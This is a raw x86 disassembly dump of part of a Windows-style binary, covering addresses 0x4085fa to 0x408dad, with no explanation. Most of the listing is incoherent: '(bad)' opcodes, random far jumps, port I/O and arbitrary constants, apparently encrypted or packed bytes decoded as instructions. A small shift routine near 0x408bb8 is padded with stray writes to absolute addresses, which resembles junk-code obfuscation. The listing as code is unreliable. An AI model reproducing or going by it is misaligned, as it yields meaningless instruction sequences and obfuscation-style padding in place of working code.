  4085fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4085fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4085fc:	xor    al,0xf2
  4085fe:	sub    al,0xd
  408600:	pushf  
  408601:	loop   0x408678
  408603:	aad    0xb6
  408605:	and    ebp,edi
  408607:	gs mov ecx,0x18e0e617
  40860d:	fadd   QWORD PTR [ebp-0x7cdc58e5]
  408613:	arpl   WORD PTR [ebx+edx*1+0x43],bp
  408617:	xchg   cl,dh
  408619:	and    al,BYTE PTR [ebx]
  40861b:	scas   eax,DWORD PTR es:[edi]
  40861c:	jecxz  0x40865c
  40861e:	lds    ecx,FWORD PTR ds:0xe5f617e
  408624:	aas    
  408625:	jmp    FWORD PTR [ecx]
  408627:	cld    
  408628:	cld    
  408629:	addr16 mov ebx,0x43532a3e
  40862f:	fwait
  408630:	retf   0x1273
  408633:	push   cs
  408634:	neg    BYTE PTR [ecx-0x5c]
  408637:	dec    esi
  408638:	or     eax,0xa4f72061
  40863d:	push   edx
  40863e:	shl    DWORD PTR [eax-0x125dc731],1
  408644:	jno    0x4085f5
  408646:	jnp    0x408625
  408648:	inc    edi
  408649:	adc    esp,DWORD PTR [edx+0x6b]
  40864c:	mov    ebp,0x7ca537d3
  408651:	fadd   QWORD PTR [eax+0x76]
  408654:	pushf  
  408655:	xchg   BYTE PTR [edx-0x360f6247],ah
  40865b:	sbb    bh,ch
  40865d:	xor    BYTE PTR [ebp+ebp*8+0x15],cl
  408661:	inc    esp
  408662:	outs   dx,DWORD PTR ds:[esi]
  408663:	mov    dh,0xcc
  408665:	ins    DWORD PTR es:[edi],dx
  408666:	adc    al,0xaf
  408668:	stos   DWORD PTR es:[edi],eax
  408669:	mov    edx,0x8f43f382
  40866e:	xchg   esp,eax
  40866f:	dec    esi
  408670:	(bad)  
  408671:	xor    al,0xbb
  408673:	add    BYTE PTR [ebp+0x464c26f1],bl
  408679:	xor    ah,BYTE PTR [edi+ebx*8]
  40867c:	jo     0x408637
  40867e:	add    dl,dh
  408680:	xor    BYTE PTR [edi+ebp*2+0x379e4380],ch
  408687:	in     eax,dx
  408688:	dec    edx
  408689:	cmp    bl,dh
  40868b:	sub    DWORD PTR [eax+0x15],eax
  40868e:	cwde   
  40868f:	xchg   BYTE PTR [eax+0x2d],bh
  408692:	jne    0x408640
  408694:	fisub  DWORD PTR [eax+0x7bfae156]
  40869a:	mov    eax,0x50ad59ff
  40869f:	fwait
  4086a0:	hlt    
  4086a1:	dec    esp
  4086a2:	pop    ds
  4086a3:	and    cl,bh
  4086a5:	xchg   BYTE PTR [eax-0x10],ah
  4086a8:	cmp    ecx,esp
  4086aa:	and    eax,0x2aadfd7c
  4086af:	jnp    0x4086dd
  4086b1:	cli    
  4086b2:	inc    ebp
  4086b3:	cmp    BYTE PTR [edx],al
  4086b5:	(bad)
  4086b8:	fimul  WORD PTR [esp+ebx*8+0x687dce1e]
  4086bf:	xchg   edx,eax
  4086c0:	(bad)
  4086c3:	xchg   ebx,eax
  4086c4:	push   esp
  4086c5:	inc    ebp
  4086c6:	mov    ch,0x30
  4086c8:	sbb    cl,ch
  4086ca:	sub    DWORD PTR [ebp+0x20],0x5e
  4086ce:	lds    eax,FWORD PTR [ebx*4-0x67bbf5c3]
  4086d5:	popf   
  4086d6:	pop    edi
  4086d7:	std    
  4086d8:	pop    ss
  4086d9:	retf   
  4086da:	jns    0x40870a
  4086dc:	mov    bh,0xd5
  4086de:	jno    0x4086ae
  4086e0:	nop
  4086e1:	or     dl,BYTE PTR [eax-0x66]
  4086e4:	xchg   ebx,eax
  4086e5:	pop    esi
  4086e6:	inc    ebx
  4086e7:	sti    
  4086e8:	lea    ecx,[ecx-0x64bbd75]
  4086ee:	pop    es
  4086ef:	int    0x3b
  4086f1:	xchg   edx,eax
  4086f2:	add    dl,bh
  4086f4:	and    eax,0xb1193a16
  4086f9:	jae    0x40868b
  4086fb:	add    BYTE PTR [edi-0x3c26737b],bl
  408701:	in     eax,0x88
  408703:	fdivr  st(2),st
  408705:	jmp    0xbd32:0xc52efecb
  40870c:	cmc    
  40870d:	sub    ah,dh
  40870f:	(bad)  
  408710:	std    
  408711:	xor    ecx,DWORD PTR [ebx]
  408713:	idiv   BYTE PTR [edx-0x79]
  408716:	pop    es
  408717:	ds adc eax,0xa7b46744
  40871d:	cwde   
  40871e:	(bad)  
  40871f:	jge    0x408781
  408721:	add    cl,BYTE PTR [ebx]
  408723:	lea    ebp,[eax+0x2d]
  408726:	jmp    0x408763
  408728:	jnp    0x408777
  40872a:	pop    ebp
  40872b:	into   
  40872c:	jae    0x408765
  40872e:	mov    ebx,0x24713082
  408733:	sbb    DWORD PTR [ebx-0x18aebe7e],esi
  408739:	call   0x7dd77bb8
  40873e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40873f:	jns    0x408701
  408741:	js     0x408706
  408743:	or     al,0x22
  408745:	xchg   BYTE PTR [ecx-0x72],dh
  408748:	adc    dl,BYTE PTR [edi+0x4f5581f8]
  40874e:	push   ss
  40874f:	sbb    eax,DWORD PTR [ebp-0x77f6a301]
  408755:	aad    0xa9
  408757:	inc    edx
  408758:	mov    al,0xdb
  40875a:	adc    ebx,DWORD PTR [ebp+0x1e]
  40875d:	mov    dh,0xf7
  40875f:	pop    ebx
  408760:	push   esp
  408761:	pop    ebp
  408762:	sbb    ecx,DWORD PTR [ecx+0x7de82ecc]
  408768:	fs (bad) 
  40876b:	mov    DWORD PTR [ebx+edx*1],ebx
  40876e:	call   0x62145f5c
  408773:	cli    
  408774:	cmp    BYTE PTR [ecx+0x17],bl
  408777:	test   eax,0xbd319038
  40877c:	bnd jne 0x4087b4
  40877f:	jae    0x4087ba
  408781:	xor    eax,0x529fb552
  408786:	retf   
  408787:	jmp    0x1bea:0xd3ca2a37
  40878e:	test   BYTE PTR [ebx+0x66],dh
  408791:	je     0x408719
  408793:	in     eax,0x36
  408795:	std    
  408796:	(bad)  
  408797:	scas   eax,DWORD PTR es:[edi]
  408798:	and    DWORD PTR [esp+eiz*8-0x3b],ebx
  40879c:	sbb    BYTE PTR [edi-0x59e239b],cl
  4087a2:	inc    ebx
  4087a3:	pop    ss
  4087a4:	pop    esp
  4087a5:	mov    bl,0x34
  4087a7:	mov    ebp,0x257bb21a
  4087ac:	(bad)  
  4087af:	pop    es
  4087b0:	pop    ds
  4087b1:	cmp    eax,0xc700e2bf
  4087b6:	adc    esp,DWORD PTR [eax-0x49]
  4087b9:	scas   eax,DWORD PTR es:[edi]
  4087ba:	daa    
  4087bb:	jnp    0x4087d2
  4087bd:	mov    ?,WORD PTR [esi]
  4087bf:	and    eax,eax
  4087c1:	xchg   esp,eax
  4087c2:	ret    
  4087c3:	pop    ebp
  4087c4:	xchg   ah,ah
  4087c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4087c7:	mov    WORD PTR [edi],ss
  4087c9:	jge    0x40883b
  4087cb:	fisub  DWORD PTR [esi+ecx*4-0x79]
  4087cf:	dec    eax
  4087d0:	xchg   ebx,eax
  4087d1:	mov    dl,BYTE PTR [ebx*2-0x79a8c1b1]
  4087d8:	retf   
  4087d9:	sbb    DWORD PTR [ebx+eiz*8-0x7f],edi
  4087dd:	imul   eax
  4087df:	mov    ch,BYTE PTR [ebx]
  4087e1:	pushf  
  4087e2:	mov    ecx,edi
  4087e4:	shrd   eax,ecx,0x2
  4087e8:	or     eax,DWORD PTR [ebp+0x10]
  4087eb:	shr    ecx,0x2
  4087ee:	or     ecx,DWORD PTR [ebp+0x14]
  4087f1:	jmp    0x408b92
  4087f6:	sbb    cl,cl
  4087f8:	ins    DWORD PTR es:[edi],dx
  4087f9:	xchg   esi,eax
  4087fa:	mov    bl,0xba
  4087fc:	cmp    BYTE PTR [edx+ebp*4-0x21],cl
  408800:	xchg   esp,eax
  408801:	nop
  408802:	rol    DWORD PTR [esi+ecx*2-0x62],cl
  408806:	mov    esi,0xbdbebe73
  40880b:	les    edi,FWORD PTR [esi+0x7dfbfbe]
  408811:	mov    DWORD PTR [ecx-0x6e],esp
  408814:	in     al,dx
  408815:	lods   al,BYTE PTR ds:[esi]
  408816:	dec    esi
  408817:	and    ebp,DWORD PTR [esi+eax*1]
  40881a:	xor    BYTE PTR [esi],dl
  40881c:	pop    esp
  40881d:	shl    DWORD PTR [eax+ebp*8],cl
  408820:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408821:	test   eax,0xc2c5419
  408826:	xchg   edi,eax
  408827:	cs jecxz 0x40884f
  40882a:	aad    0x2
  40882c:	push   ds
  40882d:	push   esp
  40882e:	call   0xf90f3972
  408833:	ins    DWORD PTR es:[edi],dx
  408834:	shl    DWORD PTR [ebx],0xe2
  408837:	jl     0x408881
  408839:	(bad)  
  40883a:	rcr    DWORD PTR [edx-0x6d],cl
  40883d:	(bad)  
  40883e:	out    dx,al
  40883f:	xor    ch,ah
  408841:	mov    eax,0x8ee65f22
  408846:	das    
  408847:	mov    cl,0x81
  408849:	cmp    DWORD PTR [edx-0x7c],ecx
  40884c:	sahf   
  40884d:	fild   WORD PTR [edi-0x29]
  408850:	inc    esp
  408851:	push   edi
  408852:	lods   al,BYTE PTR ds:[esi]
  408853:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408854:	add    al,0x8a
  408856:	mov    al,0x54
  408858:	addr16 push ecx
  40885a:	enter  0xe4e3,0xc4
  40885e:	dec    ebx
  40885f:	pop    edx
  408860:	in     al,dx
  408861:	loop   0x408807
  408863:	xchg   edx,eax
  408864:	inc    edi
  408865:	mov    edx,DWORD PTR [esi]
  408867:	pop    edx
  408868:	mov    ch,BYTE PTR [ebp-0x4d29cf7]
  40886e:	inc    esi
  40886f:	repnz inc esi
  408871:	fcom   st(1)
  408873:	test   BYTE PTR [eax+edx*1],ah
  408876:	sbb    al,0xfd
  408878:	or     al,0xdc
  40887a:	stc    
  40887b:	test   eax,0x59b30261
  408880:	or     ah,BYTE PTR [ebp-0x5ebc354a]
  408886:	fisubr WORD PTR [edi-0x36]
  408889:	mov    DWORD PTR [ecx+0x73],eax
  40888c:	lahf   
  40888d:	adc    BYTE PTR [edi+0x31cdee5b],dh
  408893:	leave  
  408894:	sub    BYTE PTR [edx-0x80],dl
  408897:	and    BYTE PTR [ecx-0x45],ah
  40889a:	mov    esi,0xde072255
  40889f:	into   
  4088a0:	jb     0x408913
  4088a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4088a3:	retf   0xbc9b
  4088a6:	ds in  al,0xe7
  4088a9:	fisubr DWORD PTR [edx+ebx*4-0x7db3d283]
  4088b0:	mov    ecx,0x22f0b6f5
  4088b5:	dec    edi
  4088b6:	cli    
  4088b7:	fldenv [edi-0x7a]
  4088ba:	mov    al,0x7b
  4088bc:	sbb    DWORD PTR [ecx],edx
  4088be:	jecxz  0x4088f0
  4088c0:	mov    ebx,0x4b654b20
  4088c6:	arpl   WORD PTR [ecx+ecx*8-0x641bb701],bx
  4088cd:	shl    ecx,0x7b
  4088d0:	int3   
  4088d1:	push   0x56
  4088d3:	dec    edx
  4088d4:	jnp    0x408900
  4088d6:	xor    eax,0xb7e55a6d
  4088db:	pop    esp
  4088dc:	push   cs
  4088dd:	and    DWORD PTR [ebx-0x3025bb8b],ecx
  4088e3:	mov    ds:0x25dca7b9,eax
  4088e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4088e9:	dec    esp
  4088ea:	mov    eax,ds:0x2554954a
  4088ef:	xchg   BYTE PTR [eax+ecx*4-0x50],al
  4088f3:	adc    BYTE PTR [edx+edi*2],ah
  4088f6:	pop    edx
  4088f7:	xchg   edi,eax
  4088f8:	iret   
  4088f9:	lods   eax,DWORD PTR ds:[esi]
  4088fa:	mov    BYTE PTR [esi-0x4f9eb551],al
  408900:	aam    0x39
  408902:	jae    0x40890c
  408904:	dec    esp
  408905:	pop    ebp
  408906:	mov    edi,0x6d04dc3d
  40890b:	imul   edi,DWORD PTR [eax-0x5a4fccb1],0x1008a05f
  408915:	(bad)  
  408916:	lods   al,BYTE PTR ds:[esi]
  408917:	gs stos DWORD PTR es:[edi],eax
  408919:	imul   edx,DWORD PTR ds:0x19190070,0x40cd727
  408923:	out    dx,al
  408924:	inc    eax
  408925:	daa    
  408926:	jg     0x408912
  408928:	sub    eax,0x6c4149c
  40892d:	and    dl,ah
  40892f:	adc    al,0x95
  408931:	in     al,dx
  408932:	xchg   edx,eax
  408933:	mov    ebx,0x12640022
  408938:	jnp    0x4088c1
  40893a:	stos   DWORD PTR es:[edi],eax
  40893b:	dec    ecx
  40893c:	ret    0x7364
  40893f:	jp     0x408956
  408941:	loop   0x4089a0
  408943:	xchg   ebp,eax
  408944:	jmp    0x43f081f2
  408949:	pop    esp
  40894a:	jae    0x408915
  40894c:	jmp    0xc1f8abe5
  408951:	sbb    eax,0x8ae61a6f
  408956:	ins    DWORD PTR es:[edi],dx
  408957:	shr    dh,cl
  408959:	repz clc 
  40895b:	inc    edi
  40895c:	rcl    BYTE PTR [edx-0x3],0xbe
  408960:	xchg   ebp,edi
  408962:	out    dx,al
  408963:	not    DWORD PTR [ebx]
  408965:	sbb    bh,bl
  408967:	xor    ebx,DWORD PTR [esp+ebp*1]
  40896a:	cld    
  40896b:	aas    
  40896c:	xchg   ecx,eax
  40896d:	and    al,0xe3
  40896f:	xchg   edx,eax
  408970:	jne    0x4089b4
  408972:	dec    ebx
  408973:	(bad)  
  408974:	aam    0x6
  408976:	jge    0x4089d3
  408978:	imul   esp,DWORD PTR [eax],0xffffff96
  40897b:	pop    es
  40897c:	jbe    0x40899f
  40897e:	hlt    
  40897f:	fsub   DWORD PTR ds:0x97e27dd4
  408985:	sar    DWORD PTR [esi],cl
  408987:	fisubr DWORD PTR [ecx-0x4a054b6c]
  40898d:	xchg   edi,eax
  40898e:	xor    al,0x32
  408990:	jns    0x408993
  408992:	sbb    DWORD PTR [edi],0x97a896d8
  408998:	push   esp
  408999:	jecxz  0x4089e7
  40899b:	adc    DWORD PTR [ecx+edx*2-0x4d],esi
  40899f:	sub    dl,ah
  4089a1:	les    ebx,FWORD PTR [esi]
  4089a3:	dec    esi
  4089a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4089a5:	and    BYTE PTR [ebx+0x7b],ah
  4089a8:	loopne 0x4089d5
  4089aa:	in     eax,0xcc
  4089ac:	push   es
  4089ad:	jle    0x408948
  4089af:	add    bl,ch
  4089b1:	mov    ds:0x731e0058,eax
  4089b6:	fidivr WORD PTR [esi]
  4089b8:	sub    edx,eax
  4089ba:	or     al,0x79
  4089bc:	pop    ebp
  4089bd:	int3   
  4089be:	xchg   DWORD PTR [ecx],eax
  4089c0:	icebp  
  4089c1:	add    DWORD PTR [di-0x6246],eax
  4089c6:	dec    edx
  4089c7:	sbb    al,0x97
  4089c9:	fs aad 0x9
  4089cc:	popf   
  4089cd:	jo     0x408979
  4089cf:	add    esi,DWORD PTR [esi]
  4089d1:	fucomp st(7)
  4089d3:	adc    al,0x13
  4089d5:	mov    esi,0xa1efc595
  4089da:	mov    BYTE PTR [eax],bh
  4089dc:	mov    WORD PTR [ecx-0x2cf3c9fb],es
  4089e2:	pop    es
  4089e3:	mov    ch,0x6c
  4089e5:	or     BYTE PTR [esi-0x1c81d0d8],al
  4089eb:	nop
  4089ec:	shr    BYTE PTR [esi+ecx*2],cl
  4089ef:	mov    ds:0xaeec2b07,eax
  4089f4:	adc    cl,BYTE PTR [ebp+0x10d04414]
  4089fa:	cmp    al,0xd4
  4089fc:	enter  0x68f,0xa4
  408a00:	rol    DWORD PTR [ebx],0xbd
  408a03:	adc    BYTE PTR [ecx+0x60fadb5],dl
  408a09:	popa   
  408a0a:	mov    eax,0x379afe82
  408a0f:	mov    ch,0xfa
  408a11:	cli    
  408a12:	jne    0x40899b
  408a14:	pop    esp
  408a15:	adc    esi,esp
  408a17:	ret    
  408a18:	aaa    
  408a19:	adc    esi,ebp
  408a1b:	stos   DWORD PTR es:[edi],eax
  408a1c:	mov    esp,0xd213fbdc
  408a21:	push   ebx
  408a22:	pop    ecx
  408a23:	cmp    ch,dh
  408a25:	stos   DWORD PTR es:[edi],eax
  408a26:	or     edx,DWORD PTR [esi-0x4c76e0e6]
  408a2c:	out    0x30,al
  408a2e:	dec    esi
  408a2f:	and    dh,BYTE PTR [ecx]
  408a31:	in     al,0x92
  408a33:	(bad)  
  408a34:	test   al,0x22
  408a36:	jg     0x408a62
  408a38:	push   es
  408a39:	pop    ebp
  408a3a:	test   al,0x34
  408a3c:	ins    DWORD PTR es:[edi],dx
  408a3d:	mov    esp,0x17cad118
  408a42:	pop    esp
  408a43:	pop    esp
  408a44:	or     ecx,ebx
  408a46:	rcl    BYTE PTR [edi],0xe7
  408a49:	pop    ebp
  408a4a:	and    al,bl
  408a4c:	pop    esp
  408a4d:	les    ebp,FWORD PTR [edx+esi*2-0x2122746a]
  408a54:	inc    ecx
  408a55:	aad    0xb6
  408a57:	fs ja  0x408a77
  408a5a:	cld    
  408a5b:	loope  0x408a97
  408a5d:	retf   
  408a5e:	std    
  408a5f:	push   0x7e192f1c
  408a64:	lds    esi,FWORD PTR [ebp-0x2f]
  408a67:	jg     0x408a23
  408a69:	pop    edx
  408a6a:	add    DWORD PTR [edi-0x33],eax
  408a6d:	mov    ch,0xb8
  408a6f:	aad    0xe3
  408a71:	rcr    DWORD PTR [ebx-0xa],cl
  408a74:	loop   0x408ab7
  408a76:	mov    eax,ds:0x646210fc
  408a7b:	dec    esi
  408a7c:	sbb    DWORD PTR [edx+0x7a],ebx
  408a7f:	mov    dl,0x51
  408a81:	enter  0xe7db,0xfc
  408a85:	arpl   WORD PTR [eax-0x20],cx
  408a88:	mov    esp,DWORD PTR [ecx]
  408a8a:	push   ebx
  408a8b:	lds    edi,FWORD PTR [edi-0x2a4a4403]
  408a91:	rcr    bl,cl
  408a93:	sbb    al,0x17
  408a95:	mov    dh,0xc7
  408a97:	scas   eax,DWORD PTR es:[edi]
  408a98:	shl    eax,0x9
  408a9b:	mov    dl,0x22
  408a9d:	cs ret 
  408a9f:	or     BYTE PTR [edx+0x2c2c1326],al
  408aa5:	jae    0x408b23
  408aa7:	dec    esp
  408aa8:	dec    eax
  408aa9:	push   eax
  408aaa:	cld    
  408aab:	mov    ecx,0xd1659c0b
  408ab0:	or     eax,0x2d0295c1
  408ab5:	stos   DWORD PTR es:[edi],eax
  408ab6:	dec    esi
  408ab7:	xchg   BYTE PTR ds:0x9b2e0984,bh
  408abd:	mov    cl,0xb4
  408abf:	rcr    DWORD PTR [esi],0x46
  408ac2:	adc    edx,esi
  408ac4:	mov    ch,0x10
  408ac6:	push   ecx
  408ac7:	ins    BYTE PTR es:[edi],dx
  408ac8:	aam    0xb1
  408aca:	ins    BYTE PTR es:[edi],dx
  408acb:	leave  
  408acc:	jnp    0x408a53
  408ace:	fsubr  QWORD PTR [edx-0x7d]
  408ad1:	loope  0x408aba
  408ad3:	nop
  408ad4:	adc    ebp,esi
  408ad6:	ret    0x6ebd
  408ad9:	test   BYTE PTR [esp+ecx*1-0x1],al
  408add:	outs   dx,BYTE PTR ds:[esi]
  408ade:	es fwait
  408ae0:	jecxz  0x408ac1
  408ae2:	into   
  408ae3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ae4:	sbb    bl,cl
  408ae6:	in     eax,dx
  408ae7:	int    0x55
  408ae9:	and    BYTE PTR [edx-0x4b89452e],ah
  408aef:	cmp    BYTE PTR [ebp-0x57],ah
  408af2:	enter  0xc107,0x73
  408af6:	rol    esp,cl
  408af8:	or     ebx,esi
  408afa:	cmc    
  408afb:	dec    ecx
  408afc:	or     bl,ch
  408afe:	(bad)  
  408aff:	bnd jb 0x408a9d
  408b02:	leave  
  408b03:	jae    0x408ab9
  408b05:	xchg   edi,eax
  408b06:	ret    
  408b07:	jbe    0x408aa1
  408b09:	(bad)  
  408b0a:	psubd  mm4,QWORD PTR [edx+eiz*2-0x6fbe42ba]
  408b12:	and    ebp,DWORD PTR ds:0x1d85019d
  408b18:	push   0xd0d1e6ed
  408b1d:	cmp    ah,BYTE PTR [ebx+0x55ad8351]
  408b23:	mov    BYTE PTR [edi+edi*2-0x769906be],0x32
  408b2b:	outs   dx,BYTE PTR ds:[esi]
  408b2c:	jnp    0x408b33
  408b2e:	or     eax,0xfe90bd62
  408b33:	add    BYTE PTR [ebp-0x10f0eceb],dh
  408b39:	test   BYTE PTR [edx+0x56137081],0x42
  408b40:	test   ah,al
  408b42:	imul   eax,DWORD PTR [edi-0x22],0xce42514f
  408b49:	xchg   edx,esi
  408b4b:	push   ecx
  408b4c:	retf   
  408b4d:	cmp    DWORD PTR [ebp-0x5b],ecx
  408b50:	sub    BYTE PTR [ecx-0x4d],dl
  408b53:	adc    al,0xfe
  408b56:	cmp    DWORD PTR [esi+0x1345f37c],esp
  408b5c:	mov    bl,BYTE PTR [ebx+eax*1]
  408b5f:	or     DWORD PTR [ebx],ebx
  408b61:	pusha  
  408b62:	in     eax,0x61
  408b64:	into   
  408b65:	test   eax,0x3f31f4ab
  408b6a:	dec    ebx
  408b6b:	ret    0xf87d
  408b6e:	jle    0x408bee
  408b70:	fs retf 
  408b72:	stos   BYTE PTR es:[edi],al
  408b73:	loopne 0x408aff
  408b75:	int    0x91
  408b77:	or     DWORD PTR [ebp-0x71ba19c8],ebx
  408b7d:	cmp    al,0x1a
  408b7f:	push   ds
  408b80:	xchg   ebp,eax
  408b81:	jnp    0x408b4b
  408b83:	pop    esi
  408b84:	retf   
  408b85:	fistp  DWORD PTR [ecx+0x30]
  408b88:	call   0xbc8eb17d
  408b8d:	xchg   DWORD PTR [esi],esi
  408b8f:	sub    DWORD PTR [edi+0x16],0x850fd03b
  408b96:	or     DWORD PTR [eax],eax
  408b98:	add    BYTE PTR [eax],al
  408b9a:	cmp    DWORD PTR [ebp+0xc],ecx
  408b9d:	je     0x408bb3
  408ba3:	push   DWORD PTR [ebp+0x20]
  408ba6:	push   DWORD PTR [ebp+0x1c]
  408ba9:	push   DWORD PTR [ebp+0x18]
  408bac:	push   ebx
  408bad:	push   esi
  408bae:	call   0x411472
  408bb3:	pop    edi
  408bb4:	leave  
  408bb5:	ret    0x1c
  408bb8:	cmp    cl,0x40
  408bbb:	jae    0x408bf8
  408bc1:	cmp    cl,0x20
  408bc4:	mov    DWORD PTR ds:0x42833d,0x1ce5
  408bce:	jae    0x408be4
  408bd4:	xor    DWORD PTR ds:0x428501,0x6917
  408bde:	shrd   eax,edx,cl
  408be1:	shr    edx,cl
  408be3:	ret    
  408be4:	mov    eax,edx
  408be6:	xor    edx,edx
  408be8:	and    cl,0x1f
  408beb:	mov    DWORD PTR ds:0x428559,0x321d
  408bf5:	shr    eax,cl
  408bf7:	ret    
  408bf8:	xor    eax,eax
  408bfa:	xor    edx,edx
  408bfc:	ret    
  408bfd:	push   ebp
  408bfe:	mov    ebp,esp
  408c00:	jmp    0x408e7f
  408c05:	addr16 hlt 
  408c07:	js     0x408c4d
  408c09:	jl     0x408c57
  408c0b:	jnp    0x408c09
  408c0d:	dec    edx
  408c0e:	xlat   BYTE PTR ds:[ebx]
  408c0f:	pop    esi
  408c10:	sahf   
  408c11:	cwde   
  408c12:	sahf   
  408c13:	ror    edi,0xbd
  408c16:	jns    0x408bd6
  408c18:	mov    esi,0xbebec279
  408c1d:	in     eax,dx
  408c1e:	jne    0x408bf8
  408c20:	ret    
  408c21:	ret    
  408c22:	std    
  408c23:	mov    ds:0xa2eeaf9c,al
  408c28:	add    eax,0x3684ba89
  408c2d:	inc    ecx
  408c2e:	je     0x408ca3
  408c30:	bound  ebp,QWORD PTR ds:0xbfd22de1
  408c36:	fistp  QWORD PTR [ebx+0x3f]
  408c39:	loopne 0x408cb4
  408c3b:	daa    
  408c3c:	push   edx
  408c3d:	pop    es
  408c3e:	sbb    al,0x4f
  408c40:	loopne 0x408be7
  408c42:	mov    cl,0xda
  408c44:	cmp    al,0x89
  408c46:	in     al,dx
  408c47:	repz fidivr WORD PTR [ebx+0x6d]
  408c4b:	out    0xcd,al
  408c4d:	push   es
  408c4e:	fidivr DWORD PTR [ecx-0x6d]
  408c51:	and    BYTE PTR [esi+edi*1-0x7bf86399],bl
  408c58:	xor    ah,BYTE PTR ds:0x5e77159f
  408c5e:	je     0x408c7a
  408c60:	cmp    al,0x79
  408c62:	add    DWORD PTR [ecx],edx
  408c64:	(bad)  
  408c65:	and    dl,BYTE PTR [eax+ebp*8]
  408c68:	and    ah,BYTE PTR [esi+0x235bf310]
  408c6e:	icebp  
  408c6f:	imul   ebx,DWORD PTR [edi],0x24
  408c72:	mov    esp,0xae2cd8d3
  408c77:	es sti 
  408c79:	xor    eax,0x210c719b
  408c7e:	repnz in al,0x26
  408c81:	fld    QWORD PTR [ebp+0x2a]
  408c84:	int    0x24
  408c86:	ror    DWORD PTR [esi-0x34b60ea0],cl
  408c8c:	and    BYTE PTR [edi-0x55],ah
  408c8f:	pop    es
  408c90:	sub    dl,BYTE PTR [esi-0x1a]
  408c93:	dec    ecx
  408c94:	imul   esp,eax,0xa9ddcd8a
  408c9a:	pop    ecx
  408c9b:	sub    al,0xe7
  408c9d:	aad    0x89
  408c9f:	mov    ebp,0xfcf16b09
  408ca4:	outs   dx,DWORD PTR ds:[esi]
  408ca5:	jno    0x408d12
  408ca7:	nop
  408ca8:	adc    DWORD PTR [edx],ebp
  408caa:	inc    esp
  408cab:	lea    esp,[edx]
  408cad:	stos   DWORD PTR es:[edi],eax
  408cae:	add    al,0x3c
  408cb0:	fadd   st,st(7)
  408cb2:	ins    DWORD PTR es:[edi],dx
  408cb3:	pop    ecx
  408cb4:	inc    eax
  408cb5:	pop    esi
  408cb6:	pop    ecx
  408cb7:	es in  al,0xa6
  408cba:	mov    ds:0x703cfb08,eax
  408cbf:	cmp    eax,DWORD PTR [eax-0x3b]
  408cc2:	jne    0x408c9b
  408cc4:	js     0x408ced
  408cc6:	and    BYTE PTR [ebp+0x75],0xdb
  408cca:	mov    ebp,0x877ad2c5
  408ccf:	pop    ecx
  408cd0:	adc    bh,BYTE PTR [edi]
  408cd2:	mov    ds:0xaafb632d,eax
  408cd7:	aad    0x67
  408cd9:	stos   DWORD PTR es:[edi],eax
  408cda:	or     dh,0xa1
  408cdd:	or     BYTE PTR [edx-0x18],dh
  408ce0:	(bad)  
  408ce1:	jmp    0x408c6b
  408ce3:	xchg   edx,esi
  408ce5:	jnp    0x408ca9
  408ce7:	sub    esp,DWORD PTR [eax+0x5e87ded6]
  408ced:	(bad)  
  408cee:	xlat   BYTE PTR cs:[ebx]
  408cf0:	and    edi,DWORD PTR [esi+edi*8+0x43]
  408cf4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408cf5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408cf6:	mov    ch,0xf2
  408cf8:	or     BYTE PTR [esi+0x45091a5e],0x8b
  408cff:	test   al,0xfd
  408d01:	adc    esi,0x50b0a0c1
  408d07:	(bad)  
  408d09:	cmp    al,0x42
  408d0b:	std    
  408d0c:	std    
  408d0d:	(bad)  
  408d0f:	jno    0x408cbc
  408d11:	inc    esp
  408d12:	and    bl,BYTE PTR [edi]
  408d14:	sbb    bl,BYTE PTR [ecx+0x7b]
  408d17:	daa    
  408d18:	jbe    0x408d57
  408d1a:	xchg   esi,eax
  408d1b:	gs cli 
  408d1d:	(bad)  
  408d1e:	sti    
  408d1f:	cs in  al,0xea
  408d22:	pop    es
  408d23:	ret    
  408d24:	jp     0x408d5c
  408d26:	cwde   
  408d27:	aad    0x2f
  408d29:	shl    DWORD PTR [eax],cl
  408d2b:	push   eax
  408d2c:	sahf   
  408d2d:	clc    
  408d2e:	sahf   
  408d2f:	popa   
  408d30:	jge    0x408ce4
  408d32:	push   0xf4ba691d
  408d37:	loope  0x408d01
  408d39:	push   eax
  408d3a:	sahf   
  408d3b:	xor    al,0x7f
  408d3d:	inc    esi
  408d3e:	ds pop ebx
  408d40:	xor    DWORD PTR [esi],ecx
  408d42:	std    
  408d43:	xchg   eax,esp
  408d45:	aas    
  408d46:	jae    0x408d65
  408d48:	or     BYTE PTR [eax+ebx*2-0x55],ch
  408d4c:	mov    ds:0x6072c0e5,eax
  408d51:	xor    BYTE PTR [esp+ecx*1],0xe0
  408d55:	sub    BYTE PTR [ebx+0x5d91b5f],al
  408d5b:	fistp  QWORD PTR [esi+0xed6a241]
  408d61:	sub    bl,BYTE PTR [ebx+edx*2+0x13532f88]
  408d68:	cwde   
  408d69:	aas    
  408d6a:	sub    eax,0xd12e9952
  408d6f:	dec    eax
  408d70:	add    eax,0xfc703712
  408d75:	ins    DWORD PTR es:[edi],dx
  408d76:	test   al,0xf6
  408d78:	fadd   QWORD PTR [ebx]
  408d7a:	fcom   DWORD PTR [edi-0x1]
  408d7d:	push   esi
  408d7e:	sub    eax,0x32d6557c
  408d83:	xor    ch,BYTE PTR [edx-0x26905879]
  408d89:	paddb  mm5,QWORD PTR [ecx+0x2c]
  408d8d:	mov    ebx,DWORD PTR [edi+0x28]
  408d90:	shl    DWORD PTR [ebx-0x74],cl
  408d93:	out    dx,al
  408d94:	aas    
  408d95:	inc    ebx
  408d96:	(bad)  
  408d97:	and    BYTE PTR [ecx],ch
  408d99:	leave  
  408d9a:	mov    edi,0xbe522d8f
  408d9f:	sbb    al,0x93
  408da1:	shr    BYTE PTR [esi+0x20de751b],1
  408da7:	xchg   esi,eax
  408da8:	dec    ebx
  408da9:	popf   
  408daa:	push   edx
  408dab:	in     al,dx
  408dac:	lods   eax,DWORD PTR ds:[esi]
  408dad:	lea    edx,[ebx]
